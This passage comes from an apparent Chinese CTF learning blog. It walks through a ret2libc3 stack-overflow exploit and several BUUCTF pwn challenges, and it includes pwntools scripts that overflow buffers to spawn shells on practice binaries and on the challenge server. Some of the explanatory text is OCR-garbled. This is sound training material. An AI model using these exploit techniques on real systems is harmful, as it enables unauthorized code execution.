获取<code>puts</code>函数在过程链接表中的地址，我们将利用它来打印泄露的地址。</li><li><code>main_addr</code>: 这是<code>main</code>函数在二进制文件中的地址，之后我们将返回到这个地址。</li></ul><h6 id="4-接收初始输出"><a href="#4-接收初始输出" class="headerlink" title="4.接收初始输出:"></a>4.<strong>接收初始输出</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&quot;ret2libc3\n&quot;</span>)<br></code></pre></td></tr></table></figure><h6 id="5-创建第一个payload"><a href="#5-创建第一个payload" class="headerlink" title="5.创建第一个payload:"></a>5.<strong>创建第一个payload</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pythonpayload1 = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span> + p32(<span class="hljs-number">0</span>)  <br>payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)  <br></code></pre></td></tr></table></figure><ul><li><p>payload1</p><p>: 创建用于溢出缓冲区的payload。</p><ul><li><code>b&quot;a&quot;*0x108</code>: 用’a’填充栈，填充到返回地址的位置（共0x108字节）。</li><li><code>p32(0)</code>: 这是为保存的EBP（基址指针）设置的占位符。</li><li><code>p32(puts_plt)</code>: 溢出后，它将跳转到<code>puts</code>，这允许我们泄露地址。</li><li><code>p32(main_addr)</code>: 结束时将跳转回<code>main</code>函数，以便可以重复该过程。</li><li><code>p32(gets_got)</code>: <code>gets</code>在GOT中的地址，以便<code>puts</code>会打印它的地址。</li></ul></li></ul><h6 id="6-发送第一个payload"><a href="#6-发送第一个payload" class="headerlink" title="6.发送第一个payload:"></a>6.<strong>发送第一个payload</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendline(payload1)  <br></code></pre></td></tr></table></figure><h6 id="7-接收泄露的地址"><a href="#7-接收泄露的地址" class="headerlink" title="7.接收泄露的地址:"></a>7.<strong>接收泄露的地址</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">leak_addr = u32(p.recv(<span class="hljs-number">4</span>))  <br></code></pre></td></tr></table></figure><ul><li>接收从GOT中打印出的4字节泄露地址，并将其转换为32位无符号整数。</li></ul><h6 id="8-计算libc的基址"><a href="#8-计算libc的基址" class="headerlink" title="8.计算libc的基址:"></a>8.<strong>计算libc的基址</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pythonlibc_base = leak_addr - libc.symbols[<span class="hljs-string">&quot;gets&quot;</span>]  <br>libc.address = libc_base  <br></code></pre></td></tr></table></figure><ul><li><p>通过从泄露的<code>gets</code>地址中减去<code>gets</code>的偏移量来计算libc的基址。</p></li><li><p>更新<code>libc</code>对象以反映这个基址。</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412071954618.png" alt="image-20241207195424535"></p></li></ul><h6 id="9-记录libc基址"><a href="#9-记录libc基址" class="headerlink" title="9.记录libc基址"></a>9.<strong>记录libc基址</strong></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">log.success(<span class="hljs-string">&quot;libc_base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))  <br></code></pre></td></tr></table></figure><h6 id="10-获取system和”-bin-sh”的地址"><a href="#10-获取system和”-bin-sh”的地址" class="headerlink" title="10.获取system和”&#x2F;bin&#x2F;sh”的地址:"></a>10.<strong>获取system和”&#x2F;bin&#x2F;sh”的地址</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pythonsystem = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]  <br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))  <br></code></pre></td></tr></table></figure><ul><li><code>system</code>: 从libc获取<code>system</code>函数的地址。</li><li><code>binsh</code>: 在libc中搜索字符串<code>&quot;/bin/sh&quot;</code>以获取其地址，这是获取shell的关键。</li></ul><h6 id="11-再次接收提示"><a href="#11-再次接收提示" class="headerlink" title="11.再次接收提示:"></a>11.<strong>再次接收提示</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;ret2libc3\n&quot;</span>)  <br></code></pre></td></tr></table></figure><h6 id="12-创建第二个payload"><a href="#12-创建第二个payload" class="headerlink" title="12.创建第二个payload:"></a>12.<strong>创建第二个payload</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pythonpayload2 = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span> + p32(<span class="hljs-number">0</span>)  <br>payload2 += p32(system) + p32(<span class="hljs-number">0</span>) + p32(binsh)  <br></code></pre></td></tr></table></figure><ul><li><code>payload2</code>: 这个payload将再次溢出缓冲区。</li><li>此payload设置栈以调用<code>system(&quot;/bin/sh&quot;)</code>。</li><li>它覆盖返回地址为<code>system</code>函数的地址，传入<code>0</code>（对于参数的NULL值）和<code>&quot;/bin/sh&quot;</code>的地址。</li></ul><h6 id="13-发送第二个payload"><a href="#13-发送第二个payload" class="headerlink" title="13.发送第二个payload:"></a>13.<strong>发送第二个payload</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendline(payload2)  <br></code></pre></td></tr></table></figure><h6 id="14-进入交互模式"><a href="#14-进入交互模式" class="headerlink" title="14.进入交互模式:"></a>14.<strong>进入交互模式</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.interactive()  <br></code></pre></td></tr></table></figure><ul><li>这允许我们与通过<code>system(&quot;/bin/sh&quot;)</code>获得的shell进行交互。</li></ul><h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">leak_addr = u32(p.recv(<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure><h4 id="为什么是4个字节？"><a href="#为什么是4个字节？" class="headerlink" title="为什么是4个字节？"></a>为什么是4个字节？</h4><h5 id="1-内存地址的大小："><a href="#1-内存地址的大小：" class="headerlink" title="1.内存地址的大小："></a>1.内存地址的大小：</h5><p>在32位的系统中，内存地址通常是用32位来表示的。这样一个地址可以指向232个不同的内存位置。因此，为了能够正确处理和表示这些地址，我们需要4个字节（每个字节8位）。</p><p>在代码中，recv（4）表示实用程序请求接收4个字节的数据，这样它就能获取到一个完整的内存地址。</p><h5 id="2-整数的存储："><a href="#2-整数的存储：" class="headerlink" title="2.整数的存储："></a>2.整数的存储：</h5><p>u32（）函数的作用就是将这4个字节的数据解释为一个32位无符号整数。在不同的编程语言中，数值的大小通常会受到存储方式的影响。在使用4个字节时，可以让我们方便地存储和处理较大的值，这在存储内存地址时尤其重要。</p><h5 id="3-一致性："><a href="#3-一致性：" class="headerlink" title="3.一致性："></a>3.一致性：</h5><p>在程序中，无论是通过网络接收数据，还是通过系统调用获取地址，通常都会使用相同大小的字节。例如，在许多操作中使用的地址通常都采用4个字节的长度，因为这与处理内存的标准和习惯是一致的。</p><h4 id="system地址"><a href="#system地址" class="headerlink" title="system地址"></a>system地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">system = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br></code></pre></td></tr></table></figure><p>libc.symbols：这是一个字典，它包含了libc库中所有函数的名称和它们对应的内存地址。<br>【”system”］:通过指定键“system”，我们获取到了system 函数在 libc 中的内存地址。system函数是用来执行系统命令的函数，比如sh（shell），它可以让我们执行任何命令。<br>例如，如果libc的system 函数的地址是x12345678，那么执行这一行代码后，变量system将保存这个地址。</p><ol start="2"><li>binsh &#x3D; next(libc.search(“&#x2F;bin&#x2F;sh”))<br>libc.search(“&#x2F;bin&#x2F;sh”）：这个方法会在libc 中搜索字符串“&#x2F;bin&#x2F;sh”。这个字符串是一个常用的shell路径，表示我们想要打开一个 shell。这种搜索通常是为了找到执行命令所需要的目标。<br>next(..·）：next 用于从搜索到的结果中取出第一个匹配的结果。因为search 方法可能会返回-个可迭代的对象（一个列表或生成器），我们想要获取第一个找到的地址。<br>·结果，binsh 变量将保存“&#x2F;bin&#x2F;sh”字符串在内存中的地址。</li></ol><p>1.system&#x3D;libc.symbols[“system”］：这行代码获取了 libc 库中system 函数的地址，以便用来执<br>行命令。<br>2.binsh &#x3D;next(libc.search(“&#x2F;bin&#x2F;sh”)）：这行代码查找”&#x2F;bin&#x2F;sh”字符串在 libc 中的地址，以</p><h4 id="③："><a href="#③：" class="headerlink" title="③："></a>③：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">log.success(<span class="hljs-string">&quot;libc_base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure><p>在前面的步骤中，我们计算了 libc 库的基地址并将其存储在libc.address 中。现在，我们希望打印出这个地址，以便确认我们计算的结果是否正确。<br>2.代码分解<br>log.success(..）：这是一个logging 函数，用来输出一条成功的信息。它通常用于调试或告知用户程序当前的状态。<br>“libc_base:” + hex(libc.address) :<br>“libc_base:”:这是一个字符串，表示我们要输出的信息的开头部分，说明下面是 libc_base 的值。<br>libc.address：这个属性存储了我们刚计算出来的 libc 的基地址。它是一个整数值。<br>hex(···）：这个函数将一个整数转换成十六进制表示（以ex 开头的格式）。计算机中的地址通常用十六进制表示，因为这样可以更简洁地表示更大的数字。<br>3.合成的结果<br>·当代码执行时，它会将”libc_base:”和 libc.adress（以十六进制表示）连接起来，形成一个完整的字符串。<br>·例如，如果libc.address 是4194816，那么hex(libc.address）可能会返回‘ex4000ee′。最终输出的字符串是‘libc_base:θx4eeeoe′。<br>4.打印的结果<br>·输出信息的意义:这条信息会被打印到控制台或日志中，以方便开发者或攻击者确认他们计算的地址是正确的，并且程序在执行过程中没有错误。<br>·这种信息非常重要，因为正确的libc 基地址是后续利用中能否成功的关键.</p><h4 id="④："><a href="#④：" class="headerlink" title="④："></a>④：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">libc.address = libc_base <br></code></pre></td></tr></table></figure><p>这一行代码的意思是：<br>我们将计算出来的libc基地址（libc_base）存储到libc对象中的address属性里。</p><p>libc是一个表示libc 库的对象，这个对象的属性address用来记录整个库的起始地址。<br>在后面的代码中，我们可能需要调用libc 库中的函数。通过将基地址存储到libc.address，我们可以轻松访问libc中其他函数的位置，因为它们的地址是根据基地址来计算的。</p><p>所以，libc.address&#x3D;libc_base的功能是将计算得到的libc 基地址保存到libc对象中，以便后续的代码可以便利地使用这个地址。这是一种为后续操作准备的方式，确保在使用时候能够找到libc库的正确位置。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buu-pwn题目探索</title>
    <link href="/2024/12/04/buu-pwn%E9%A2%98%E7%9B%AE%E6%8E%A2%E7%B4%A2/"/>
    <url>/2024/12/04/buu-pwn%E9%A2%98%E7%9B%AE%E6%8E%A2%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<p>BUU–pwn题目：</p><h3 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a><strong>1.test_your_nc</strong></h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040012137.png" alt="image-20241204001221943"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">❯</span> <span class="hljs-string">checksec</span> <span class="hljs-string">test</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/p0ach1l/Desktop/buu-pwn/test&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-string">PIE</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040015297.png" alt="image-20241204001508014"></p><p>TAB反编译：</p><p>这时可以看到system函数在main里面：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040015284.png" alt="image-20241204001543176"></p><p>将文件拖到Ubuntu虚拟机（pwning文件目录里）</p><p>在本文件目录下打开终端，输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nc 地址 端口<br></code></pre></td></tr></table></figure><p>enter直接运行：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040023406.png" alt="image-20241204002325323"></p><p>输入ls:</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040025782.png" alt="image-20241204002532703"></p><p>可以看到有flag,输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cat flag<br></code></pre></td></tr></table></figure><h3 id><a href="#" class="headerlink" title></a><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040025733.png" alt="image-20241204002553660"></h3><h3 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a><strong>2.rip</strong></h3><p>题目附件：pwn1</p><ol><li></li></ol><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040037377.png" alt="image-20241204003724215"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">❯ checksec pwn1<br>[*] <span class="hljs-string">&#x27;/home/p0ach1l/Desktop/pwning/pwn1&#x27;</span><br>    Arch:       amd64-<span class="hljs-number">64</span>-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (<span class="hljs-number">0x400000</span>)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>分析：（栈溢出）</p><p>变量s离栈底为F（F转成10进制为15）</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040040747.png" alt="image-20241204004011598"></p><p>gets函数存在溢出点；</p><p>存在后门函数fun()</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040044935.png" alt="image-20241204004451795"></p><p>开始写exp：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041038247.png" alt="image-20241204103850133">f5查看：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041039256.png" alt="image-20241204103929137"></p><p>发现可以连接，接着开始写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">15</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x0000000000401187</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041059037.png"></p><p>写payload时，需要需找到s所占的字节数：（双击s，进入）</p><p>同时本题涉及栈不平衡：需要更改fun（）函数的地址</p><p>f5运行：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041103930.png" alt="image-20241204110359884"></p><p>输入ls：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041104569.png" alt="image-20241204110438507"></p><p>成功后，别忘了更改为远端地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;25496&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">15</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x0000000000401187</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行：<img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041107149.png" alt="image-20241204110747086"></p><p>输入ls</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041108692.png" alt="image-20241204110821632"></p><p>输入cat flag:</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041109119.png" alt="image-20241204110915066"></p><h3 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h3><p>本题思路：将ges函数溢出，控制到sub_40060Dsub_40060D函数</p><h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041117170.png" alt="image-20241204111743080"></h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041118020.png" alt="image-20241204111808970"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041122036.png" alt="image-20241204112229984"></p><p>编写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;25172&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x000000000040060D</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041127242.png" alt="image-20241204112719202"></p><h3 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4.ciscn_2019_n_1"></a>4.ciscn_2019_n_1</h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041247391.png" alt="image-20241204124756352"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041134458.png" alt="image-20241204113446414"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041134328.png" alt="image-20241204113459274"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ciscn_2019_n_1&quot;</span>)<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure><p>①：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041225368.png" alt="image-20241204122534315"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041224376.png" alt="image-20241204122451332"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041221106.png" alt="image-20241204122134062"></p><p>②：</p><p>通过覆盖v2地址：</p><p>要利用v1和v2的偏移（0x30-0x04&#x3D;0x2C)</p><p>再将v2的值传给它：</p><p>那么v2的值怎么找呢？</p><p>1.网路查找：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041233049.png" alt="image-20241204123319986"></p><p>2.直接点if函数进入汇编代码；</p><p>鼠标悬停在dword_4007F4就可以看到11.28125转成10进制是多少；</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412050010409.png" alt="image-20241205001020064"></p><p>3.直接转：</p><p>双击dword_4007F4直接跳转到</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412050043024.png" alt="image-20241205004307855"></p><h3 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5.pwn1_sctf_2016"></a>5.pwn1_sctf_2016</h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041238965.png" alt="image-20241204123847897"></p><p>分析这段代码：</p><p>定义的变量s据栈地3C（60），但是看fgets函数只填入了32个，没有办法栈溢出了；</p><p>但是看下面有个I,you</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">replace((std::string *)v3);<br></code></pre></td></tr></table></figure><p>妹子不理解，但是通过查看wp，了解到是将I换成了you，即一个字节转成了3个字节，这样就可以进行栈溢出了</p><p>（又查看wp，发现可以先猜测一下，他是将I换成了you，然后跑一下，看看：</p><p>{【打开终端，输入：.&#x2F;文件名】</p><p>enter后显示： tell me something about yourself:</p><p>输入III</p><p>得到youyouyou</p><p>猜测正确}</p><p><img src="/2024/12/04/buu-pwn%E9%A2%98%E7%9B%AE%E6%8E%A2%E7%B4%A2/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241204142930678.png" alt="image-20241204142930678"></p><p>好的，猜测对了）</p><h3 id="-2"><a href="#-2" class="headerlink" title></a><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041415507.png" alt="image-20241204141528424"></h3><p>写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;29971&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;I&#x27;</span>*<span class="hljs-number">20</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0X08048F0D</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041430248.png" alt="image-20241204143053201"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041423503.png" alt="image-20241204142330451"></p><h3 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h3><p>(本题涉及栈溢出，栈不平衡)</p><p>首先查看main函数，没什么好看的，点开func（）</p><p>发现read()函数</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041520500.png" alt="image-20241204152005447"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041521576.png" alt="image-20241204152136510"></p><p>还可以发现callsystem函数，找到system函数，</p><p>因此思路非常清晰，将buf溢出，控制到call system函数就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041522476.png" alt="image-20241204152223395"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./level0&quot;</span>)<br>payload =  <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x0000000000400597</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041519892.png" alt="image-20241204151901820"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041530974.png" alt="image-20241204153020897"></p><h3 id="7-第五空间2019-决赛-PWN5"><a href="#7-第五空间2019-决赛-PWN5" class="headerlink" title="7.[第五空间2019 决赛]PWN5"></a>7.[第五空间2019 决赛]PWN5</h3><p>考察格式化字符串漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041536582.png" alt="image-20241204153640514"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042041277.png" alt="image-20241204204135165"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042050030.png" alt="image-20241204205037946"></p><h3 id="8-ciscn-2019-n-8"><a href="#8-ciscn-2019-n-8" class="headerlink" title="8.ciscn_2019_n_8"></a>8.ciscn_2019_n_8</h3><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>die</p><p>反汇编查看：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-1Ch]</span><br><br>  var[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  var[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">init</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, var, v4, v5);<br>  <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] == <span class="hljs-number">17LL</span> )          <span class="hljs-comment">//如果var中的第14个数为17，进入</span><br>      <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);                        <span class="hljs-comment">//找到system</span><br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<br>        <span class="hljs-string">&quot;something wrong! val is %d&quot;</span>,<br>        var[<span class="hljs-number">0</span>],<br>        var[<span class="hljs-number">1</span>],<br>        var[<span class="hljs-number">2</span>],<br>        var[<span class="hljs-number">3</span>],<br>        var[<span class="hljs-number">4</span>],<br>        var[<span class="hljs-number">5</span>],<br>        var[<span class="hljs-number">6</span>],<br>        var[<span class="hljs-number">7</span>],<br>        var[<span class="hljs-number">8</span>],<br>        var[<span class="hljs-number">9</span>],<br>        var[<span class="hljs-number">10</span>],<br>        var[<span class="hljs-number">11</span>],<br>        var[<span class="hljs-number">12</span>],<br>        var[<span class="hljs-number">13</span>],<br>        var[<span class="hljs-number">14</span>]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s, 